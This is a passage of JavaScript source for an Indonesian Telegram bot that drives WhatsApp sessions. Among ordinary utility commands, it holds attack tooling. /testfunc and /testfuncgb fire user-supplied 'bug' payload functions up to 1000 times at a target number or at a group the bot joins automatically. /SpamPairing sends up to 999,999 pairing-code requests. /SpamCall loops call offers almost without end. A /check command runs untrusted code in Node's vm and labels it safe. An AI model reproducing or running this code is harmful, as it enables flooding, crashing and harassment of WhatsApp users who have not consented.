    `🔴 *Auto-Update DIMATIKAN.*\n` +
    `Gunakan /autoupdate on untuk mengaktifkan kembali.`,
    { parse_mode: "Markdown" }
  );
}

// ── MIDDLEWARE OWNER ONLY ─────────────────────────────────────
function ownerOnly(msg) {
  if (!msg.from || msg.from.id !== CONFIG.OWNER_ID) {
    bot.sendMessage(msg.chat.id, "⛔ Perintah ini hanya untuk *owner*.", { parse_mode: "Markdown" });
    return false;
  }
  return true;
}

// ================================================================
//  COMMANDS
// ================================================================

// /autoupdate on|off
bot.onText(/\/autoupdate (on|off)/i, async (msg, match) => {
  if (!ownerOnly(msg)) return;
  const action = match[1].toLowerCase();
  if (action === "on") await startAutoUpdate(msg.chat.id);
  else stopAutoUpdate(msg.chat.id);
});

// /checkupdate — cek manual sekarang
bot.onText(/\/checkupdate/, async (msg) => {
  if (!ownerOnly(msg)) return;
  bot.sendMessage(msg.chat.id, "🔍 Mengecek update dari GitHub...");
  await checkUpdate(msg.chat.id);
});

// /updatestatus — lihat status lengkap
bot.onText(/\/updatestatus/, (msg) => {
  if (!ownerOnly(msg)) return;
  bot.sendMessage(msg.chat.id,
    `📊 *Status Auto-Update*\n\n` +
    `Status  : ${autoUpdateEnabled ? "🟢 AKTIF" : "🔴 MATI"}\n` +
    `SHA     : ${lastKnownSHA ? `\`${lastKnownSHA.slice(0, 7)}\`` : "_belum dicek_"}\n` +
    `Interval: ${CONFIG.INTERVAL_MIN} menit\n` +
    `Source  : [GitHub](${CONFIG.RAW_URL})`,
    { parse_mode: "Markdown", disable_web_page_preview: true }
  );
});


bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

// VERSI Node-bot-telegram
bot.onText(/\/tofotolive(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const argsText = match[1];

    if (!argsText) {
        return bot.sendMessage(chatId, 
            '❌ **Format Salah**\n\n' +
            'Gunakan format:\n`/tofotolive <videoUrl> <audioUrl> [fade]`\n\n' +
            '**Contoh:**\n`/tofotolive https://.../video.mp4 https://.../audio.mp3 0.5`', 
            { parse_mode: 'Markdown' }
        );
    }

    const args = argsText.split(' ');
    if (args.length < 2) {
        return bot.sendMessage(chatId, '❌ **Argumen Kurang**\n\nDibutuhkan setidaknya `videoUrl` dan `audioUrl`.', { parse_mode: 'Markdown' });
    }

    const [videoUrl, audioUrl, fade] = args;
    const statusMessage = await bot.sendMessage(chatId, '⏳ Sedang memproses, harap tunggu...');

    try {
        let apiUrl = `https://shynne-apis.vercel.app/tools/livephoto?videoUrl=${encodeURIComponent(videoUrl)}&audioUrl=${encodeURIComponent(audioUrl)}`;
        if (fade) {
            apiUrl += `&fade=${fade}`;
        }

        console.log(`Requesting API: ${apiUrl}`);

        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer'
        });

        await bot.sendDocument(chatId, Buffer.from(response.data), {
            caption: '✅ Foto Live berhasil dibuat!'
        }, {
            filename: 'livephoto.mov', 
            contentType: 'video/quicktime'
        });

        bot.deleteMessage(chatId, statusMessage.message_id);

    } catch (error) {
        console.error(error);
        bot.editMessageText('❌ **Terjadi Kesalahan**\n\nGagal membuat foto live. Pastikan link video dan audio valid dan dapat diakses secara publik.', {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: 'Markdown'
        });
    }
});

bot.onText(/\/check/, async (msg) => {
    const chatId = msg.chat.id;
    const reply = msg.reply_to_message;
    
    // Fungsi pembantu untuk ambil foto baru setiap kali dipanggil
    const getNewPhoto = () => typeof getRandomImage === 'function' ? getRandomImage() : "https://via.placeholder.com/500";

    if (!reply) return bot.sendMessage(chatId, "❌ ☇ Reply kode atau file <b>.js</b> yang ingin dicek.", { parse_mode: "HTML" });

    let codeToTest = "";
    try {
        // 1. AMBIL KODE
        if (reply.document) {
            if (!reply.document.file_name.endsWith('.js')) {
                return bot.sendMessage(chatId, "❌ ☇ File harus berformat <b>.js</b>", { parse_mode: "HTML" });
            }
            const fileLink = await bot.getFileLink(reply.document.file_id);
            const response = await axios.get(fileLink);
            codeToTest = response.data;
        } else if (reply.text) {
            codeToTest = reply.text;
        }

        // 2. PROSES ANALISA (Hanya Teks Sementara)
        const loadingMsg = await bot.sendMessage(chatId, "🔍 <i>Analyzing code...</i>", { parse_mode: "HTML" });

        try {
            // 3. VM CHECKING
            const sandbox = { console, Buffer, process: { env: {} }, module: {}, exports: {} };
            const context = vm.createContext(sandbox);
            const script = new vm.Script(codeToTest, { filename: 'user_code.js' });
            script.runInContext(context, { timeout: 1500 });

            // --- HASIL SUKSES (KIRIM FOTO) ---
            await bot.sendPhoto(chatId, getNewPhoto(), {
                caption: `<blockquote><b>⌜ ✅ ⌟ CHECK SUCCESS</b></blockquote>\n\n` +
                         `⌑ <b>Status:</b> No Syntax Error\n` +
                         `⌑ <b>Result:</b> Kode aman dan siap dijalankan!\n\n` +
                         `<i>Semua struktur kurung dan variabel terlihat normal.</i>`,
                parse_mode: "HTML"
            });
            await bot.deleteMessage(chatId, loadingMsg.message_id);

        } catch (err) {
            // --- HASIL ERROR (KIRIM FOTO) ---
            const stack = err.stack || "";
            const lines = codeToTest.split('\n');
            const match = stack.match(/user_code\.js:(\d+)/);
            const lineNum = match ? parseInt(match[1]) : null;
            
            let errorSnippet = "";
            let recommendation = "Periksa kembali logika kodemu.";

            if (lineNum && lines[lineNum - 1]) {
                errorSnippet = `<code>${lines[lineNum - 1].trim()}</code>`;
                if (err.message.includes("is not defined")) recommendation = "Ada variabel yang lupa dideklarasikan atau typo.";
                if (err.message.includes("Unexpected token")) recommendation = "Kurang tanda baca seperti <code>}</code>, <code>)</code>, atau <code>;</code>";
            }

            const errorText = 
                `<blockquote><b>⌜ ❌ ⌟ ERROR DETECTED</b></blockquote>\n\n` +
                `⌑ <b>Message:</b> <code>${err.message}</code>\n` +
                `⌑ <b>Line:</b> ${lineNum || 'Unknown'}\n\n` +
                `⌑ <b>Kode Bermasalah:</b>\n${errorSnippet || 'Tidak terbaca'}\n\n` +
                `⌑ <b>Fix:</b> ${recommendation}`;

            await bot.sendPhoto(chatId, getNewPhoto(), {
                caption: errorText,
                parse_mode: "HTML"
            });
            await bot.deleteMessage(chatId, loadingMsg.message_id);
        }
    } catch (e) {
        bot.sendMessage(chatId, "❌ Error fatal: " + e.message);
    }
});

bot.onText(/\/cekidch(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];

    if (!link || !link.includes("whatsapp.com/channel/")) {
        return bot.sendMessage(chatId, "❌ ☇ Masukkan link saluran WA yang valid.\nContoh: <code>/cekidch https://whatsapp.com/channel/0029Va...</code>", { parse_mode: "HTML" });
    }

    // Mengambil Invite Code dari link
    const inviteCode = link.split("channel/")[1];

    try {
        // Proses ini membutuhkan koneksi WA (sock) yang aktif
        // Pastikan variabel 'sock' tersedia di scope ini
        const res = await sock.newsletterMetadata("invite", inviteCode);

        if (res) {
            const info = `<blockquote><b>⌜ 📢 ⌟ WHATSAPP CHANNEL INFO</b></blockquote>\n\n` +
                         `⌑ <b>Nama:</b> ${res.name}\n` +
                         `⌑ <b>ID Saluran:</b> <code>${res.id}</code>\n` +
                         `⌑ <b>Status:</b> ${res.state}\n` +
                         `⌑ <b>Followers:</b> ${res.subscribers || 'Tersembunyi'}\n` +
                         `⌑ <b>Role Kamu:</b> ${res.viewer_metadata?.role || 'Guest'}\n\n` +
                         `⌑ <b>Deskripsi:</b>\n<i>${res.description || 'Tidak ada deskripsi'}</i>`;

            await bot.sendMessage(chatId, info, { parse_mode: "HTML" });
        }
    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ ☇ <b>Gagal!</b>\nSaluran tidak ditemukan atau bot tidak memiliki akses ke fitur Newsletter.");
    }
});


bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

function createSafeSock(sock) {
    // Fungsi ini membungkus sock asli agar lebih aman saat dijalankan di VM
    return {
        ...sock,
        sendMessage: async (...args) => {
            try {
                return await sock.sendMessage(...args);
            } catch (e) {
                console.error("SafeSock Error:", e.message);
            }
        }
    };
}


bot.onText(/\/testgb (.+) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const groupLink = match[1].trim();
    let jumlah = Math.max(0, Math.min(parseInt(match[2]) || 1, 1000));

    try {
        // --- AMBIL KODE INVITE ---
        const inviteRegex = /chat\.whatsapp\.com\/([a-zA-Z0-9]{20,26})/;
        const inviteMatch = groupLink.match(inviteRegex);
        if (!inviteMatch) return bot.sendMessage(chatId, "❌ Link grup tidak valid");
        const groupCode = inviteMatch[1];

        if (!msg.reply_to_message) {
            return bot.sendMessage(chatId, "❌ Reply dengan function atau file .js");
        }

        // --- AMBIL KODE BUG (TEKS/FILE) ---
        let funcCode = "";
        if (msg.reply_to_message.document) {
            const fileId = msg.reply_to_message.document.file_id;
            const fileLink = await bot.getFileLink(fileId);
            const res = await axios.get(fileLink);
            funcCode = res.data;
        } else {
            funcCode = msg.reply_to_message.text;
        }

        // --- KIRIM STATUS AWAL ---
        const processMsg = await bot.sendPhoto(chatId, "https://g.top4top.io/p_3788ghdlv1.jpg", {
            caption: `
<blockquote><pre>⬡═―—⊱ ⎧ Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 Group ⎭ ⊰―—═⬡</pre></blockquote>
▢  Target: Group Link
▢  Type: GB Auto Join & Bug
▢  Status: Joining Group...
╘═——————————————═⬡`,
            parse_mode: "HTML"
        });

        const safeSock = createSafeSock(sock); // 'sock' harus tersedia secara global atau didefinisikan
        let targetJid;

        // --- LOGIKA JOIN ---
        try {
            const groupData = await sock.groupGetInviteInfo(groupCode);
            targetJid = groupData.id;
            await sock.groupAcceptInvite(groupCode);
            await sleep(2500); 
            console.log(chalk.green(`[SUCCESS] Berhasil Join: ${targetJid}`));
        } catch (e) {
            if (!e.message.includes("409")) {
                return bot.editMessageCaption(`❌ Gagal Join Otomatis: ${e.message}`, {
                    chat_id: chatId,
                    message_id: processMsg.message_id
                });
            }
            // Jika 409, ambil targetJid secara manual jika perlu atau asumsikan tetap lanjut
        }

        // --- LOGIKA VM ---
        const sandbox = {
            console, Buffer, chalk, sock: safeSock, target: targetJid, sleep,
            generateWAMessageFromContent, generateForwardMessageContent,
            generateWAMessage, prepareWAMessageMedia, proto, jidDecode, areJidsSameUser
        };
        const context = vm.createContext(sandbox);

        let fn;
        if (funcCode.includes("async function")) {
            const matchFunc = funcCode.match(/async function\s+(\w+)/);
            const funcName = matchFunc ? matchFunc[1] : null;
            fn = vm.runInContext(`${funcCode}\n${funcName}`, context);
        } else {
            const wrapper = `async function tempFunc(sock, target) { 
                try { ${funcCode} } catch(e) {} 
            }; tempFunc`;
            fn = vm.runInContext(wrapper, context);
        }

        // --- UPDATE STATUS KE PROCESSING ---
        await bot.editMessageCaption(`
<blockquote><pre>⬡═―—⊱ ⎧ Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 Group ⎭ ⊰―—═⬡</pre></blockquote>
▢  Target: Group Link
▢  Type: GB Auto Join & Bug
▢  Status: Sending ${jumlah} Bug...
╘═——————————————═⬡`, {
            chat_id: chatId,
            message_id: processMsg.message_id,
            parse_mode: "HTML"
        });

        // --- EKSEKUSI LOOP ---
        for (let i = 0; i < jumlah; i++) {
            try {
                await fn(safeSock, targetJid);
                console.log(chalk.green(`[SUCCESS] Bug ke-${i+1} terkirim.`));
            } catch (e) {
                console.log(chalk.red(`[ERROR] Bug ke-${i+1} gagal: ${e.message}`));
            }
            await sleep(2000);
        }

        // --- FINAL STATUS ---
        await bot.editMessageCaption(`
<blockquote><pre>⬡═―—⊱ ⎧ Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 Group ⎭ ⊰―—═⬡</pre></blockquote>
▢  Target: ${groupLink}
▢  Type: GB SUCCESS
▢  Status: Join & Success Sent ${jumlah} Bug
╘═——————————————═⬡`, {
            chat_id: chatId,
            message_id: processMsg.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "! Check", url: groupLink }]]
            }
        });

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "⚠️ Terjadi kesalahan pada sistem.");
    }
});

bot.onText(/^\/testfunc (.+)/, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;
    const randomImage = getRandomImage();

    const replyId = msg.reply_to_message
      ? msg.reply_to_message.message_id
      : msg.message_id;

    const args = msg.text.split(" ");

    if (args.length < 3)
      return bot.sendMessage(
        chatId,
        "🪧 ☇ Format: /testfunc 62xxx 10 (reply function/file)",
        { reply_to_message_id: replyId }
      );

    if (sessions.size === 0) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote><tg-emoji emoji-id="5350496629008917458">🚫</tg-emoji> Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx</blockquote>`,
        parse_mode: "HTML",
      });
    }

    const q = args[1];

    const jumlah = Math.max(
      0,
      Math.min(parseInt(args[2]) || 1, 1000)
    );

    if (isNaN(jumlah) || jumlah <= 0)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Jumlah harus angka",
        { reply_to_message_id: replyId }
      );

    const target =
      q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let funcCode = "";

    if (msg.reply_to_message) {
      if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
      }
      else if (msg.reply_to_message.document) {

        const fileName =
          msg.reply_to_message.document.file_name || "";

        if (
          !fileName.endsWith(".js") &&
          !fileName.endsWith(".txt")
        ) {
          return bot.sendMessage(
            chatId,
            "❌ ☇ File harus .js atau .txt",
            { reply_to_message_id: replyId }
          );
        }

        const fileId =
          msg.reply_to_message.document.file_id;

        const file =
          await bot.getFile(fileId);

        const fileUrl =
          `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

        const response =
          await axios.get(fileUrl);

        funcCode = response.data;
      }
    }

    if (!funcCode)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Reply function text atau file .js/.txt",
        { reply_to_message_id: replyId }
      );
    const processMsg = await bot.sendPhoto(
      chatId,
      randomImage,
      {
        caption: `<blockquote>Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process <tg-emoji emoji-id="5352940967911517739">⏳</tg-emoji>
</blockquote>`,
        parse_mode: "HTML",
        reply_to_message_id: replyId,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check Target",
                url: `https://wa.me/${formattedNumber}`,
                style: "danger"
              },
            ],
          ],
        },
      }
    );

    const processMessageId =
      processMsg.message_id;

    const createSafeSock = (sock) => sock;

    const safeSock =
      createSafeSock(sock);

    const matchFunc = funcCode.match(
      /async function\s+([a-zA-Z0-9_]+)/
    );

    if (!matchFunc)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Function tidak valid",
        { reply_to_message_id: replyId }
      );

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context =
      vm.createContext(sandbox);

    const wrapper = `
${funcCode}

${funcName}
`;

    const fn =
      vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {

      try {

        const arity = fn.length;

        if (arity === 1) {

          await fn(target);

        } else if (arity === 2) {

          await fn(safeSock, target);

        } else {

          await fn(
            safeSock,
            target,
            true
          );

        }

      } catch (err) {

        console.error(err);

      }

      await sleep(200);

    }

    const finalText = `<blockquote>Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success <tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>
</blockquote>`;

    try {

      await bot.editMessageCaption(
        finalText,
        {
          chat_id: chatId,
          message_id: processMessageId,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Check Target",
                  url: `https://wa.me/${formattedNumber}`,
                  style: "danger"
                },
              ],
            ],
          },
        }
      );

    } catch (e) {

      await bot.sendPhoto(
        chatId,
        randomImage,
        {
          caption: finalText,
          parse_mode: "HTML",
          reply_to_message_id: replyId,
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Check Target",
                  url: `https://wa.me/${formattedNumber}`,
                  style: "danger"
                },
              ],
            ],
          },
        }
      );

    }

  } catch (err) {

    console.error(err);

    bot.sendMessage(
      msg.chat.id,
      "FUNCTION LU EROR BANGKE",
      {
        reply_to_message_id: msg.message_id,
      }
    );

  }
});

bot.onText(/^\/testfuncgb (.+)/, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const targetInput = match[1]; // Bisa link group atau nomor
    const randomImage = getRandomImage();

    const replyId = msg.reply_to_message
      ? msg.reply_to_message.message_id
      : msg.message_id;

    const args = msg.text.split(" ");

    if (args.length < 3)
      return bot.sendMessage(
        chatId,
        "🪧 ☇ Format: /testfuncgb linkgrup 10 (reply function/file)",
        { reply_to_message_id: replyId }
      );

    if (sessions.size === 0) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote><tg-emoji emoji-id="5350496629008917458">🚫</tg-emoji> Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx</blockquote>`,
        parse_mode: "HTML",
      });
    }

    // Ambil session pertama yang tersedia
    const sock = sessions.values().next().value; 

    const jumlah = Math.max(
      0,
      Math.min(parseInt(args[2]) || 1, 1000)
    );

    if (isNaN(jumlah) || jumlah <= 0)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Jumlah harus angka",
        { reply_to_message_id: replyId }
      );

    let target = "";
    let isGroup = false;

    // Logika Deteksi Link Grup
    if (targetInput.includes("chat.whatsapp.com/")) {
      const inviteCode = targetInput.split("chat.whatsapp.com/")[1];
      try {
        // Mendapatkan JID grup dari link invite
        target = await sock.groupAcceptInvite(inviteCode);
        isGroup = true;
      } catch (err) {
        return bot.sendMessage(chatId, "❌ ☇ Link grup tidak valid atau bot sudah dikeluarkan", { reply_to_message_id: replyId });
      }
    } else {
      // Jika bukan link, anggap nomor telepon
      target = targetInput.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    }

    let funcCode = "";

    if (msg.reply_to_message) {
      if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
      } else if (msg.reply_to_message.document) {
        const fileName = msg.reply_to_message.document.file_name || "";
        if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
          return bot.sendMessage(
            chatId,
            "❌ ☇ File harus .js atau .txt",
            { reply_to_message_id: replyId }
          );
        }
        const fileId = msg.reply_to_message.document.file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const response = await axios.get(fileUrl);
        funcCode = response.data;
      }
    }

    if (!funcCode)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Reply function text atau file .js/.txt",
        { reply_to_message_id: replyId }
      );

    const processMsg = await bot.sendPhoto(
      chatId,
      randomImage,
      {
        caption: `<blockquote>Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>

⌑ Target: ${isGroup ? "WhatsApp Group" : targetInput}
⌑ Type: Unknown Function
⌑ Status: Process <tg-emoji emoji-id="5352940967911517739">⏳</tg-emoji>

</blockquote>`,
        parse_mode: "HTML",
        reply_to_message_id: replyId,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check Target",
                url: isGroup ? targetInput : `https://wa.me/${targetInput.replace(/[^0-9]/g, "")}`,
              },
            ],
          ],
        },
      }
    );

    const processMessageId = processMsg.message_id;
    const createSafeSock = (sock) => sock;
    const safeSock = createSafeSock(sock);

    const matchFunc = funcCode.match(
      /async function\s+([a-zA-Z0-9_]+)/
    );

    if (!matchFunc)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Function tidak valid",
        { reply_to_message_id: replyId }
      );

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context = vm.createContext(sandbox);
    const wrapper = `
      ${funcCode}
      ${funcName}
    `;

    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
      } catch (err) {
        console.error(err);
      }
      await sleep(200);
    }

    const finalText = `<blockquote>Xylent 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 Group <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>

⌑ Target: ${isGroup ? "WhatsApp Group" : targetInput}
⌑ Type: Unknown Function
⌑ Status: Success <tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>

</blockquote>`;

    try {
      await bot.editMessageCaption(
        finalText,
        {
          chat_id: chatId,
          message_id: processMessageId,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Check Target",
                  url: isGroup ? targetInput : `https://wa.me/${targetInput.replace(/[^0-9]/g, "")}`,
                },
              ],
            ],
          },
        }
      );
    } catch (e) {
      await bot.sendPhoto(
        chatId,
        randomImage,
        {
          caption: finalText,
          parse_mode: "HTML",
          reply_to_message_id: replyId,
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "Check Target",
                  url: isGroup ? targetInput : `https://wa.me/${targetInput.replace(/[^0-9]/g, "")}`,
                },
              ],
            ],
          },
        }
      );
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(
      msg.chat.id,
      "FUNCTION LU EROR BANGKE",
      {
        reply_to_message_id: msg.message_id,
      }
    );
  }
});



bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("senzypairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWASocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/k8nmnc.jpg", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/hapusbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /hapusbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
